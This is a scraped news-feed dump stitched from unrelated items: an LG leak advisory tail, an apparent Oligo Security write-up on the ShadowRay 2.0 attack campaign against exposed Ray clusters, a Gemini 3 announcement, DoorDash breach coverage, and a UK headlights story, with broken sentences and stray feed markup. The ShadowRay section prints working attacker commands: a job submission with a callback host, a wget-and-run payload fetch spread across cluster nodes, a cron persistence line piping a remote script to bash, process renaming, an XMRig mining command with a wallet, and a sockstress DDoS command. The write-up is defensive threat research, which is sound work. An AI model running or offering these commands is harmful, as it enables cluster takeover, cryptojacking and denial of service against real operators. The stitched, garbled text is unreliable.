activity.Supply Chain Security AssessmentsRegular security assessments of contractors and vendors are essential to identify and remediate vulnerabilities before they can be exploited. These assessments should include penetration testing, security questionnaires, and compliance verification.Incident Response CoordinationWhen breaches involve third parties, coordinated incident response becomes critical. Organizations should establish clear communication channels and response procedures with contractors to ensure rapid containment and remediation.FOR US BUSINESSES & ORGANIZATIONSIMMEDIATE ACTIONS (Next 24-48 Hours): Scan for leaked credentials using tools like Have I Been Pwned (haveibeenpwned.com) to identify if any organizational credentials have been exposed Rotate all suspected keys, passwords, and API tokens immediately, especially those that may have been hardcoded in applications or configuration files Review and audit all contractor and vendor access permissions, identifying any unnecessary or excessive privileges Review and secure SMTP server configurations, implement multi-factor authentication, and monitor for suspicious email activitySHORT-TERM ACTIONS (Next 30 Days): Conduct comprehensive code reviews to identify and remove any hardcoded credentials, replacing them with secure credential management solutions Perform security assessments of all contractors and vendors, verifying their security practices and compliance with your security requirements Implement least-privilege access principles, regularly audit permissions, and remove unnecessary access rights Deploy advanced monitoring solutions to detect anomalous activity, especially from contractor access pointsLONG-TERM STRATEGY (Ongoing): Implement enterprise-grade secrets management solutions (e.g., HashiCorp Vault, AWS Secrets Manager) to eliminate hardcoded credentialsSupply Chain Security Program: Establish a comprehensive third-party risk management program with regular assessments, security requirements, and incident response procedures Provide security awareness training to contractors and vendors, ensuring they understand and follow your security policiesIncident Response Planning: Develop and regularly test incident response plans that include procedures for third-party breaches and supply chain incidentsFOR INDIVIDUAL USERS & CONSUMERS Regularly monitor your accounts for suspicious activity, especially if you use LG devices or services Keep all LG devices and applications updated with the latest security patches and firmware updates Use strong, unique passwords for all accounts and enable multi-factor authentication wherever possible Be cautious of emails claiming to be from LG, especially those requesting personal information or credentialsReport Suspicious Activity: Report any suspicious activity or potential security incidents to LG customer support and relevant authoritiesFOR GOVERNMENT CONTRACTORS & CRITICAL INFRASTRUCTUREEnhanced Third-Party Requirements: Implement enhanced security requirements for contractors, including mandatory security assessments, background checks, and compliance verification Deploy 24/7 security operations center (SOC) monitoring for all contractor access points and third-party integrations Establish mandatory incident reporting procedures for third-party breaches, with specific timeframes and federal agency coordinationSupply Chain Security Standards: Adhere to federal supply chain security standards (e.g., NIST SP 800-161, CMMC) and ensure contractors meet these requirements Implement zero trust network architecture to minimize the impact of compromised contractor credentials hardcode credentials in source code or configuration files – use secure credential management solutions instead ignore third-party security assessments – contractors and vendors must meet your security standards delay credential rotation – rotate all suspected keys immediately, even before official breach confirmation assume contractor security – verify and continuously monitor third-party accessEMERGENCY RESOURCES & REPORTINGReport Cybersecurity Incidents:FBI Internet Crime Complaint Center (IC3):Emergency Hotline: 1-800-CALL-FBI (1-800-225-5324)For: Criminal cyber incidents, data breaches, credential theftEmail: central@cisa.dhs.gov24/7 Operations: 1-888-282-0870For: Infrastructure threats, supply chain incidents, vulnerabilitiesUS-CERT (Computer Emergency Readiness Team):For: Technical assistance, vulnerability reporting, incident coordinationFree Security Tools & Resources:RELATED ARTICLES ON CYBERUPDATES365KEY TAKEAWAYS & FINAL THOUGHTSThe alleged LG Electronics data leak claim represents a significant cybersecurity concern, highlighting the fragility of global supply chains and the critical importance of third-party risk management. While LG Electronics has not yet confirmed these claims, the incident underscores the need for organizations to implement robust security measures for contractors and vendors.Critical Points to Remember: pose severe security risks and should be eliminated through secure credential management solutions is critical – a single contractor’s lapse can cascade into widespread system compromise should proactively scan for leaked credentials and rotate suspected keys immediately, even before official breach confirmationAs security firms continue to investigate these claims and urge organizations to scan for leaked credentials, the cybersecurity community remains vigilant. Organizations must prioritize supply chain security assessments and credential management while individuals should monitor their accounts and update devices regularly.The cybersecurity landscape continues to evolve rapidly, with threat actors increasingly targeting supply chains and third-party access points.

The operation, dubbed ShadowRay 2.0, exploits a known, yet disputed, flaw in Ray, an open-source framework that powers many of today’s AI systems, to quietly seize control of powerful computing clusters and conscript them into a self-replicating botnet.In early November 2025, the Oligo Security research team identified an attack campaign exploiting the ShadowRay vulnerability (CVE-2023-48022) in Ray, a widely used open-source AI framework. This is the same flaw Oligo previously observed being exploited in late 2023 (see the new MITRE, ShadowRay, Campaign C0045). For the recent campaign, attackers leveraged DevOps-style infrastructure by using GitLab as a platform for updating and delivering region-aware malware. Oligo reported this activity to Gitlab and the attacker repository and account was removed on November 5, 2025. However, Oligo has determined that the attackers have migrated to GitHub in order to continue their campaign as of November 10, 2025, creating multiple accounts and new repos. It remains active. The latest campaign represents a major evolution from our initial ShadowRay discovery. The attackers, operating under the name , have turned Ray’s legitimate orchestration features into tools for a self-propagating, globally cryptojacking operation, spreading autonomously across exposed Ray clusters.What makes this campaign particularly notable is the : our analysis shows attackers leveraged LLM-generated payloads to accelerate and adapt their methods. We also observed multiple criminal groups competing for the same CPU resources, often terminating legitimate workloads and rival cryptominers to maximize profits.Equally concerning is the campaign’s operational sophistication. The attackers limited CPU usage to ~60% to evade detection, disguised malicious processes as legitimate services, and hid GPU usage from Ray’s monitoring to avoid detection while leveraging premium compute resources. In addition, the attackers employed a DevOps-style infrastructure by using GitLab for real-time,  updates and delivery. Evidence suggests the operation could have been active since September 2024, compromising Ray clusters across multiple continents through automated OAST-based discovery.This isn’t just another cryptojacking campaign. It’s the foundation of a  capable of DDoS attacks, data exfiltration, and global autonomous propagation.What is also highly concerning is that this vulnerability is “disputed” because the maintainers indicate that Ray is not intended for use outside a “strictly-controlled network environment”. In practice however, users often deploy Ray without heeding this warning, which creates an extended window for exploitation, evidenced by its continued and expanded weaponization by attackers in the wild. In fact, there are now more than 230,000 Ray servers exposed to the internet, in contrast to the few thousand we observed during our initial ShadowRay discovery.The ShadowRay campaign from March 2024The growth of exposed Ray servers The new waves of attacks leveraging CVE-2023-48022The attack group’s techniquesHow the attackers have evaded detectionRecommendations for protectionWhy we looked into Ray (again)Our renewed research into Ray began when we were looking into some customer environments and noticed that they were running Ray. While those instances were already protected through Oligo’s runtime security platform, the potential risk was flagged to ensure proper configuration and secure deployment of Ray, meaning no Oligo customer environments were impacted or targeted in this new attack campaign.A History Lesson: The Original ShadowRay CampaignIn March 2024, Oligo unveiled ShadowRay, a vulnerability that was leveraged in the first known attack campaign exploiting AI workloads in the wild. The attackers exploited CVE-2023-48022 that impacts Ray, the open-source AI framework commonly referred to as the “Kubernetes of AI.” The flaw allows unauthenticated remote code execution (RCE) through Ray’s Jobs API. Our original research showed that thousands of exposed Ray servers had already been compromised across a variety of sectors. Attackers used them to run cryptominers, steal secrets, and exfiltrate data from live AI workloads. While certain related issues were patched, CVE-2023-48022 itself was never directly fixed. The behavior in Ray is a design feature and is safe when used in a trusted environment that is not exposed to the internet. Following the disclosure, Ray maintainers issued configuration and deployment guidance, advising that “Security and isolation must be enforced outside of the Ray Cluster.”.DISCLAIMER: The new campaign does not relate to Anyscale’s (the developers of Ray) SaaS offerings or paid products. The sole intention of this blog is to support users of Ray by increasing awareness of its security aspects and common pitfalls.This means that while the CVE can be detected in environments, there is not a specific version to upgrade to. Users are urged to follow the official Ray security guidelines and also leverage this open-source tool to verify proper configuration of their clusters to avoid accidental exposure.The Growth of Exposed Ray ServersSince early November 2025, our research team has identified significant renewed malicious activity in exposed Ray clusters around the world, nearly two years after us originally showing CVE-2023-48022 being exploited in the wild.At the time of our original research, only thousands of exposed Ray servers were observed in the wild. Our scans today reveal that over 200,000 Ray servers remain exposed to the internet, with a portion confirmed as vulnerable or already compromised. Many of the exposed servers belong to active startups, research labs, and cloud-hosted AI environments, while some are honeypots. The lack of a definitive patch, coupled with the assumption that users would self-secure their clusters, has allowed threat actors to weaponize the same underlying weakness, culminating in the new ShadowRay v2 campaign.New Threat Actors, New AttacksThe campaign we have observed mirrors some of the characteristics and behaviors consistent with ShadowRay’s original exploitation chain:RCE via the exposed Ray dashboard API.Payload injection to deploy cryptocurrency miners and data exfiltration tools.Persistence mechanisms disguised as Ray worker processes.New IoCs observed in compromised nodes (full list below).  While this new activity shares some common threads with our March 2024 research, it is being carried out by entirely new threat actors that are leveraging different techniques to reach their end goals.Two Waves of Attacks UncoveredOur analysis of the ShadowRay 2.0 activity shows that the campaign did not end with a single takedown. Instead, it evolved across two platforms:Wave One – GitLab launched: In early November 2025, attackers were using GitLab for their payload evolution and delivery. After Oligo reported the activity to GitLab, the attackers’ account and repository was removed on November 5, 2025.Wave Two – GitHub launched: Within days of the GitLab takedown, the threat actors reestablished their operation by standing up a new GitHub repository to continue the advanced attacks via a repository that went live on November 10, 2025. On November 17, the repo was taken down, with attackers immediately creating a new one on the same day. The second wave remains active, demonstrating the attackers’ persistence and agility in maintaining the campaign. Below, we walk through the technical details, findings, and evidence of the techniques the attackers have deployed in both phases of this ongoing campaign. GitLab-Launched Attack Campaign: Technical Breakdown and Evidence of TechniquesBelow, we walk through the specific techniques the attackers used in this campaign with GitLab as their delivery mechanism, providing evidence of what was uncovered and how they used their methods to evolve from simple cryptojacking efforts to building a multi-purpose botnet.1: Discovery - "Finding the Needle in the Internet Haystack"Attackers used interact.sh (an OAST platform) to spray payloads across the internet and identify which Ray dashboard IPs were exploitable. By sending callbacks to oast.fun subdomain, they could track which servers executed their commands.Attackers have triggered the very first step in Ray by posting a job that :http://[host]:[port]/api/jobs/" -H 'Content-Type: application/json' -d '{"entrypoint": "curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun"}'This is reconnaissance as a service - attackers weaponized out-of-band platforms to automatically discover vulnerable targets at scale. Instead of manual scanning, they let victims identify themselves by calling back. This approach also helps evade traditional scanning detection.2: Initial Access - "Exploiting Ray's Trust"Attackers exploited completely unauthenticated Ray Job Submission APIs (/api/jobs/) on exposed dashboards. They submitted malicious jobs with commands ranging from simple reconnaissance (uname -a, id) to complex multi-stage Bash and Python payloads.Ray's dashboard was designed for trusted internal networks but is frequently exposed to the internet without authentication. The attackers didn't need to exploit a vulnerability, they just used Ray's features as designed. This is a configuration vulnerability at scale.The obfuscated “stage 2” of the payload includes the docstrings and useless echoes, which strongly implies the code is LLM-generated:The payloads were base64-encoded. After decoding, we can see the LLM-generated payloads still include their documentation - like we saw with the rest of the payloads. Stage 2 is around resource discovery, and uses only 1 CPU. 3: Lateral Movement - "Weaponizing Ray's Orchestration"Attackers deployed a payload that used Ray's NodeAffinitySchedulingStrategy to execute malware on every alive node in the cluster. The payload literally enumerated all nodes and submitted jobs pinned to each specific node ID.This is lateral movement via legitimate orchestration features in Ray. Instead of exploiting CVEs or using network attacks, attackers used Ray's own scheduling API to spread. It's essentially using the victim's infrastructure as intended, using python code - like the applications that are already running,  just for malicious purposes:nodes=[n for n in ray.nodes() if n.get('Alive',False)]cmd='wget -qO- https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh | tr -d "\\r" > aa_clean.sh && chmod +x aa_clean.sh && ./aa_clean.sh'[ray.get(ray.remote(lambda: subprocess.run(cmd,shell=True)).options(scheduling_strategy=NodeAffinitySchedulingStrategy(node_id=n.get('NodeID')...4: AI-Generated Reconnaissance - "Using AI to Attack AI"Attackers deployed a sophisticated multi-stage Python payload that discovers cluster resources (CPUs, GPUs), calculates optimal allocation (60%), and then submits a takeover job with those exact resource requirements.The payloads from gitlab are likely to be AI-generated, based on its structure, comments, and error handling patterns. Attackers are now using AI to generate attack code targeting AI infrastructure. The 60% resource allocation is particularly clever, as it leaves enough resources running to avoid immediate detection while maximizing mining profits.Automatic CPU/GPU discovery via ray.cluster_resources()Dynamic resource calculation: usable_cpus = max(1, int(total_cpus * 0.6))Multi-stage execution with error handling5: Reverse Shells - "Opening the Backdoor"Attackers established multiple interactive reverse shells to AWS-hosted C2 servers, giving them command-line access to compromised Ray clusters. Multiple shells to different ports suggest redundancy or different attack operators.The use of multiple simultaneous reverse shells on different ports indicates either multiple attackers competing for access or sophisticated failover mechanisms. Evidence shows shells connecting to ports 3876, 40331, 48331, and 443 - suggesting extensive C2 infrastructure.6: Persistence - "Ensuring They Never Leave"Attackers installed multiple persistence mechanisms: cron jobs running every 15 minutes, systemd services disguised as system components, and .bashrc injections. The cron job continuously re-downloads and executes mon.sh from GitLab.The use of GitLab as a live C2 infrastructure means attackers can update payloads in real-time. Every 15 minutes, all compromised systems check for updates and re-infect themselves. This turns GitLab into a distributed update mechanism for malware.*/15 * * * * wget -O - https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash7: Masquerading - "Hiding in Plain Sight"Attackers renamed malicious processes to look like legitimate Linux kernel workers (kworker/0:0) and system services (dns-filter). The XMRig cryptocurrency miner was renamed to .python3.6 and disguised as a systemd service.The sophistication of process renaming goes beyond simple hiding. By using echo "kworker/0:0" > /proc/$$/comm, they change how the process appears in system monitoring tools. The name "dns-filter" suggests DNS filtering, which IT teams might expect to see running.Process rename to [kworker/0:0] (appears as kernel worker)Binary named /usr/lib/dev/systemdev/dns-filter (looks like system service)Hidden binary .python3.6 in current directorySystemd service names: custom-X-service8: GPU Mining - "Stealing Premium Compute"Attackers specifically targeted Ray clusters with NVIDIA GPUs (A100s in particular). Environment variables show NVIDIA libraries loaded and 23.9GB of GPU memory consumed, but Ray's dashboard reports 0% GPU utilization, indicating a hidden miner.GPU cryptojacking is a goldmine, because A100 GPUs cost $3-4/hour on cloud platforms. By hiding GPU usage from Ray's monitoring, attackers avoid immediate detection while stealing premium compute resources. The resource discovery payload specifically checks for GPU availability before deploying GPU-enabled miners.9: Competition Elimination - "Cryptojacker vs. Cryptojacker"Attackers deployed sophisticated scripts to detect and kill rival cryptocurrency miners. They hunt for processes matching patterns like "xmrig", "minerd", "ccminer", or any process using >25% CPU. They also block competing mining pools via /etc/hosts and firewall rules.This reveals a hidden war between cryptojacking groups. Multiple attackers are targeting the same Ray clusters, and they're actively fighting each other for resources. The scripts specifically protect their own miner (connected to supportxmr.com) while killing everything else. It's organized crime with source code.if echo "$cmdline" | grep -vq "supportxmr.com" && echo "$cmdline" | grep -q "xmrig"; thenMultiple other Monero pools via /etc/hosts and iptablesKicking out competitors - Manipulation of iptables to block other attackers and threat actors from reaching the vulnerable instance again after killing their processes.The same file as above, on GitLab - at a later point in time. Their “NEW POOL & WALLET” according to the docstrings - the attackers have been doing it with different addresses for along time.10: Geographic Targeting - "Adapting to the Victim"Attackers implemented geolocation detection to identify if the victim is in China. Chinese victims receive payloads from run-CN.sh (using China-accessible CDNs), while others get run.sh. This suggests infrastructure optimization and censorship bypass.This is region-aware malware. By detecting the victim's country, attackers can adapt delivery methods, potentially use regional proxies (GitHub proxy and Chinese IP geolocation services), and optimize for network conditions. It suggests a mature operation targeting global infrastructure world-wide.if curl -s --connect-timeout 3 -4 http://ip-api.com/json/ | grep -q '"country":"China"'; then    download_url="https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run-CN.sh"Proxied download via gh-proxy.com - so the payload will succeed in Chinese servers that have censored DNS support - or to bypass security rules that prevent requests to github.com directly.Some payloads tried using either wget or curl - usually one of them was present on the machine and fetched the initial payload from GitLab, and later, the miner through GitHub.11: Cryptocurrency Mining - "The Payoff"Attackers deployed XMRig miners connecting to pool.supportxmr.com:443 using TLS encryption. Multiple compromised clusters show 99% CPU usage and significant GPU utilization.The use of TLS on port 443 makes mining traffic look like legitimate HTTPS traffic, blending into normal network activity. The mining pool tracks show regular payouts, confirming this is an active, profitable operation.Example Mining Configuration (there were many):/usr/lib/dev/systemdev/dns-filter -o pool.supportxmr.com:443 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tlsThe files when accessed on Nov. 2The files when accessed on Nov. 4 Attacker payload changes were visible through GitLab diffs:The attackers changed their “exclude pattern” - their own miner fingerprint - that is used to distinguish other miners that were a result of another attack group.The difference was visible through GitLab easily - Here is a commit that removes all comments (probably using an LLM too).Some payloads were hosted on GitHub. This repo is used for hosting malware as GitHub version releases.Attackers have downloaded cryptominer binaries from different repositories, hosts and IPs over time. We found this gitlab username in one of the payload’s comments, probably leftovers of an older payload from an older repository. 12: Live Campaign Evolution - "Attack Infrastructure as Code"The GitLab repository ironern440-group/ironern440-project showed active commits, meaning attackers are iterating on their payloads in real-time. All compromised systems pulled updates every 15 minutes, so improvements propagate across the entire botnet within hours.This is DevOps for cybercrime. Attackers used GitLab as their CI/CD pipeline for malware distribution. They can A/B test techniques, roll back failed updates, and respond to defensive measures - all through version control. The commit history showed active development in realtime.The files when accessed in Nov. 2The files when accessed in Nov. 4Attacker payload changes were visible through GitLab.The attackers changed their “exclude pattern” - their own miner fingerprint - that is used to distinguish other miners that were a result of another attack group.The diff was visible through GitLab easily - a commit that removes all comments of the LLM-generated payloads.Some payloads were hosted on GitHub. This repo is used for hosting malware as GitHub version releases13: Sensitive Data Access - "Beyond Cryptocurrency"Attackers could see everything the workloads are doing - including access to the proprietary AI models and filesystem, application user requests, application code and configuration.They discovered and exfiltrated MySQL database credentials from Ray job environment variables and config files. The exposed credentials provide root access to a MySQL database that is used in production application.We also found many security tokens and cloud credentials present on the compromised machines workloads - by analyzing the code, command lines and and the environment variables of the running processes on the compromised machines. This reveals the attack scope extends beyond cryptojacking.With database credentials, attackers can exfiltrate sensitive data, inject backdoors into applications, or sell access to other threat actors. The presence of MySQL credentials in environment variables (just one example) suggests the compromised system is part of a larger application infrastructure.On some instances that models were present (for example, pytorch pickle file of the model weights and frozen graph). These proprietary, custom models are considered unique IP that is a competitive advantage to the company. Attackers could steal them from the compromised machines, as well as their source code and user data that was retained on the machines.14: DDoS in action - "Multi-Purpose Botnet"Attackers deployed sockstress, a TCP state exhaustion tool, targeting production websites. This suggests the compromised Ray clusters are being weaponized for denial-of-service attacks, possibly against competing mining pools or other infrastructure - or as another way to monetize their compromised hardware (compromised infrastructure as a service).This transforms the operation from pure cryptojacking into a. The ability to adds another monetization vector - attackers can rent out DDoS capacity or use it to eliminate competition. The target port 3333 is commonly used by mining pools, suggesting attacks against rival mining infrastructure.DDoS Command used by attackers:./sockstress <redacted_hostname> 3333 eth0 -p payloads/http15: Spray and Pray - "Using Victims to Find More Victims"Compromised Ray clusters were used to spray attack payloads to other Ray dashboards worldwide. The attackers essentially created a self-propagating worm that uses one victim to scan for and compromise the next victim.This is worm-like behavior in cloud infrastructure. Instead of centralized scanning (which is noisy and detectable), attackers distributed the scanning across their botnet. Each compromised cluster helps discover and infect new clusters, creating exponential growth. The use of interact.sh for callback means attackers only see successful compromises, reducing noise.Compromised Cluster A scans for exposed Ray dashboardsSends test payload with interact.sh callbackAttacker sees successful callbackAttacker sends full payload to new victimNew victim joins botnet and starts scanningGitHub-Launched Attack Campaign: Technical Breakdown and Evidence of TechniquesFollowing the attackers’ GitLab account and repository being taken down on November 5, 2025, the attackers migrated the repo to GitHub, where they remain active. They created the new GitHub repo on November 10, 2025.Below, we walk through the techniques the attackers used with GitHub as their delivery mechanism, providing evidence of what was uncovered and how they evolved their methods. The second phase was even more successful.Attackers Ported to GitHub on November 10, 2025. We identified a compromised Ray cluster and were surprised to see  in the payload from the willd, replacing the repository that was removed by GitLab after we reported the first phase.Compromised Clusters With Thousands of Active Nodes (machines)Attackers put hands on internet-facing clusters with (Worth $4M USD per year) - utilizing 100% CPU on the compromised Ray nodes:One of the servers had a network NFS mount, which included  of Source Code, AI Models and Datasets. Everything the company is doing for the past few years, exposed to the internet.:In a new mining pool for the second phase of the attack, the attackers reached the #1 spot among 100+ registered miners. The attacker HashRate (and financial reward) kept increasing until we reported the user activity to GitHub.An ELF executable that was downloaded from the attacker’s servers. We started reverse engineering it . It was an unpacker with unpopular compression that executed code through stack-based syscall direct execution Why It Matters: Growing AI Attack SurfaceAI workloads are increasingly deployed at scale, often with less mature security controls than traditional infrastructure. Because Ray’s design assumes an internal, trusted environment, many clusters are deployed with ports exposed publicly, and authentication disabled. These factors make ShadowRay a ripe vulnerability for attackers to exploit, as it has a dangerous combination of a lot of exposed infrastructure and the ability to lead to meaningful impact for attackers. As organizations race to deploy AI systems, it’s critical to remember that many AI products and services embed or depend on Ray, making it pivotal to ensure it is configured properly across environments. Plus, many AI orchestration tools remain vulnerable to 0.0.0.0-style misconfigurations that mirror ShadowRay’s exploitation pattern. The Risk of Disputed VulnerabilitiesThe ShadowRay case highlights a critical challenge in modern software security: what happens when a vulnerability is disputed instead of fixed. When Oligo first disclosed active exploitation of CVE-2023-48022 in 2024, the Ray maintainers argued that Ray should only ever run in tightly controlled, closed environments, and therefore saw no need to release a patch. Nearly two years later, attackers are still exploiting the same flaw, in new and increasingly sophisticated campaigns, even in later Ray versions that are up to date.Disputed vulnerabilities create a dangerous gray area for defenders because they are not formally patched. As a result, organizations may unknowingly deploy or run software that remains exploitable in real-world conditions. ShadowRay demonstrates how attackers exploit that uncertainty, targeting configurations that weren’t meant to be internet-facing, chaining legitimate orchestration features, and adapting rapidly with AI-generated payloads.Understanding your environment becomes essential. Knowing not only what open-source components you use, but how they are configured, exposed, and behaving at runtime, can be the difference between protection and compromise.For organizations that run Ray in their environments, below are mitigation and protection recommendations.Follow the Ray Deployment Best Practices for securing Ray deployments. Start with running Ray within a secured, trusted environment.Always add firewall rules or security groups to prevent unauthorized access.Add authorization on top of the Ray Dashboard port (8265 by default). If you do need Ray’s dashboard to be accessible, implement a proxy that adds an authorization layer to the Ray API when exposing it over the network.Continuously monitor your production environments and AI clusters for anomalies, even within Ray. Ray depends on arbitrary code execution to function. Code Scanning and Misconfiguration tools will not be able to detect such attacks, because the open-source maintainers of Ray (Anyscale) marked it as disputed and confirmed it is not a bug - at the time of writing, it is a feature.Don’t bind on 0.0.0.0 to make your life easy - It is recommended to use an IP of an explicit network interface, such as the IP that is in the subnet of your local network or a trusted private VPC/VPN.- Sometimes tools assume you read their docs. Do it. - The technical burden of securing open source is yours. Don't rely on the maintainers, there are tools that can help you protect your production workloads from the risks of using open source at runtime.Indicators of Compromise (IoCs)AWS-hosted primary C2 server for reverse shells - São Paulo, Brazil (Amazon.com, amazonaws.com)Attackers C2 / File server for downloading binariesAttackers C2 / File server for downloading binariesAttackers Reverse Shell - United Kingdom (Tornado Datacenter, cloudzy.com)Attackers Reverse Shell - Seongbuk-gu, Seoul, South Korea (KT, Cable/DSL)Attackers Reverse Shell - Dublin, Ireland (Amazon.com, amazonaws.com)Attackers Reverse Shell - Moscow, Russia (Yandex.Cloud)Attackers Reverse Shell - Helsinki, Finland (Aeza International, ptr.network)Attacker payload server (netsh, myscript.sh) - United States (Gigas Hosting Usa, LLC)Attacker - Reverse Shell - Bogor, Indonesia (PT.

Since then, it’s been incredible to see how much people love it. AI Overviews now have 2 billion users every month. The Gemini app surpasses 650 million users per month, more than 70% of our Cloud customers use our AI, 13 million developers have built with our generative models, and that is just a snippet of the impact we’re seeing.And we’re able to get advanced capabilities to the world faster than ever, thanks to our differentiated full stack approach to AI innovation — from our leading infrastructure to our world-class research and models and tooling, to products that reach billions of people around the world.Every generation of Gemini has built on the last, enabling you to do more. Gemini 1’s breakthroughs in native multimodality and long context window expanded the kinds of information that could be processed — and how much of it. Gemini 2 laid the foundation for agentic capabilities and pushed the frontiers on reasoning and thinking, helping with more complex tasks and ideas, leading to Gemini 2.5 Pro topping LMArena for over six months.And now we’re introducing Gemini 3, our most intelligent model, that combines all of Gemini’s capabilities together so you can bring any idea to life.It’s state-of-the-art in reasoning, built to grasp depth and nuance — whether it’s perceiving the subtle clues in a creative idea, or peeling apart the overlapping layers of a difficult problem. Gemini 3 is also much better at figuring out the context and intent behind your request, so you get what you need with less prompting. It’s amazing to think that in just two years, AI has evolved from simply reading text and images to reading the room.And starting today, we’re shipping Gemini at the scale of Google. That includes Gemini 3 in AI Mode in Search with more complex reasoning and new dynamic experiences. This is the first time we are shipping Gemini in Search on day one. Gemini 3 is also coming today to the Gemini app, to developers in AI Studio and Vertex AI, and in our new agentic development platform, Google Antigravity — more below.Like the generations before it, Gemini 3 is once again advancing the state of the art. In this new chapter, we’ll continue to push the frontiers of intelligence, agents, and personalization to make AI truly helpful for everyone.We hope you like Gemini 3, we'll keep improving it, and look forward to seeing what you build with it. Much more to come!]]></content:encoded></item><item><title>Tycoon 2FA and the Collapse of Legacy MFA</title><link>https://www.bleepingcomputer.com/news/security/tycoon-2fa-and-the-collapse-of-legacy-mfa/</link><author>Sponsored by Token</author><category>security</category><pubDate>Tue, 18 Nov 2025 15:01:11 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Tycoon 2FA enables turnkey real-time MFA relays behind 64,000+ attacks this year, proving legacy MFA collapses the moment a phishing kit targets it.

It disclosed a breach on October 25, 2025, where an employee fell for a social engineering attack that allowed attackers to gain account access.Breaches like these are sadly common, but it’s how DoorDash handled this breach, along with another security issue, that have given some cause for concern.Information stolen during the breach varied by user, according to DoorDash, which connects gig economy delivery drivers with people wanting food bought to their door. It said that , , , and  were stolen.DoorDash said that as well as telling law enforcement, it has added more employee training and awareness, hired a third party company to help with the investigation, and deployed unspecified improvements to its security systems to help stop similar breaches from happening again. It cooed:“At DoorDash, we believe in continuous improvement and getting 1% better every day.”However, it might want to get a little better at disclosing breaches, warn experts. It left almost three weeks in between the discovery of the event on October 25 and notifying customers on November 13, angering some customers.Just as irksome for some was the company’s insistence that “no sensitive information was accessed”. It classifies this as Social Security numbers or other government-issued identification numbers, driver’s license information, or bank or payment card information. While that data wasn’t taken, names, addresses, phone numbers, and emails are pretty sensitive.One Canadian user on X was angry enough to claim a violation of Canadian breach law, and promised further action:“I should have been notified immediately (on Oct 25) of the leak and its scope, and told they would investigate to determine if my account was affected—that way I could take the necessary precautions to protect my privacy and security. […] This process violates Canadian data breach law. I’ll be filing a case against DoorDash in provincial small claims court and making a complaint to the Office of the Privacy Commissioner of Canada.”How soon should breach notifications happen?How long is too long when it comes to breach notification? From an ethical standpoint, companies should tell customers as quickly as possible to ensure that individuals can protect themselves—but they also need time to understand what has happened. Some of these attacks can be complex, involving bad actors that have been inside networks for months and have established footholds in the system.In some jurisdictions, privacy law dictates notification within a certain period, while others are vague. Canada’s Personal Information Protection and Electronic Documents Act (PIPEDA) simply requires notification as soon as is feasible. In the US, disclosure laws are currently set on a per-state level. For example, California recently passed Senate Bill 446, which mandates reporting breaches to consumers within 30 days as of January 1, 2026. That would still leave DoorDash’s latest breach report in compliance though.This isn’t the only disclosure controversy currently surrounding DoorDash. Security researcher doublezero7 discovered an email spoofing flaw in DoorDash for Business, its platform for companies to handle meal deliveries.The flaw allowed anyone to create a free account, add fake employees, and send branded emails from DoorDash servers. Those mails would pass various email client security tests and land without a spam message in email inboxes, the researcher said.The researcher filed a report with bug bounty program HackerOne in July 2024, but it was closed as “Informative”. DoorDash didn’t fix it until this month, after the researcher complained.However, all might not be as it seems. DoorDash has complained that the researcher made financial demands around disclosure timelines that felt extortionate, according to Bleeping Computer.What actions can you take?Back to the data breach issue. What can you do to protect yourself against events like these? The Canadian X user explains that they used a fake name and forwarded email address for their account, but that didn’t stop their real phone number and physical address being leaked.You can’t avoid using your real credit card number, either—although many ecommerce sites will make saving credit card details optional.Perhaps the best way to stay safe is to use a credit monitoring service, and to watch news sites like this one for information about breaches… whenever companies decide to disclose them.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline. With Malwarebytes Personal Data Remover, you can scan to find out which sites are exposing your personal information, and then delete that sensitive data from the internet.]]></content:encoded></item><item><title>Nearly all UK drivers say headlights are too bright</title><link>https://www.bbc.com/news/articles/c1j8ewy1p86o</link><author>YeGoblynQueenne</author><category>dev</category><pubDate>Tue, 18 Nov 2025 14:11:17 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Nearly all UK drivers said they thought headlights were too bright and that they have been dazzled by oncoming vehicles, according to a major study.A study commissioned by the Department for Transport (DfT) found 97% of people surveyed found they were regularly or sometimes distracted by oncoming vehicles and 96% thought most or some headlights were too bright. Dr Shaun Helman, who led the research for Berkshire-based Transport Research Laboratory (TRL), said it provides "compelling evidence" that lights' glare is a "genuine issue for UK drivers".New measures will be included in the government's upcoming Road Safety Strategy, reflecting what is becoming an increasingly fraught issue for road users.TRL's data suggests that LED and whiter headlamps may be linked to glare and that drivers might find their whiteness harder to cope with.Of those surveyed, 33% said they had either stopped driving or are driving less at night because of lights, while another 22% said they would like to drive less at night but have no choice. A total of 1,850 drivers, matched to the age and gender split of the country's licence holding population, were surveyed for their views.TRL said LED lights used in vehicles are brighter, more concentrated and emit more blue light, which human eyes struggle with more at night.The RAC's senior policy officer Rod Dennis said: "Having campaigned hard for this study, we welcome its findings which independently confirm what drivers have been telling us – that rather than being an imagined phenomenon, some bright headlights do cause a glare problem."While drivers clearly benefit from high-performing headlights, it's important this doesn't lead to others suffering the effects of dazzle, so a balance needs to be struck," he added.Mr Dennis said that it is "vital" TRL's report is "reviewed carefully to put us on a path towards changes that ultimately benefit all road users."Denise Voon, a clinical advisor at The College of Optometrists, said the DfT should "take immediate, actionable steps to support drivers and commission more detailed research, specifically into how headlight regulations need to change".]]></content:encoded></item><item><title>Researchers Detail Tuoni C2&apos;s Role in an Attempted 2025 Real-Estate Cyber Intrusion</title><link>https://thehackernews.com/2025/11/researchers-detail-tuoni-c2s-role-in.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0fEPwtke4h6m4SAYqYOUAQSTCvVaghxz5SGIgAKzQlXlriWAB02H4u9ueIs8oX7vH4a3Xx46gIt-0qC_eEECEMdyBADDmMnoNvbNM-5wIwkVPSo0f88Sy2Ik5bvBQdxtwRWGO6vQvzj_rPWpAYJbfOuGNK0q6yNhyE9QR5h98xsW7d8A6yBQ8p0P5bt4G/s1600/c2.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 14:00:00 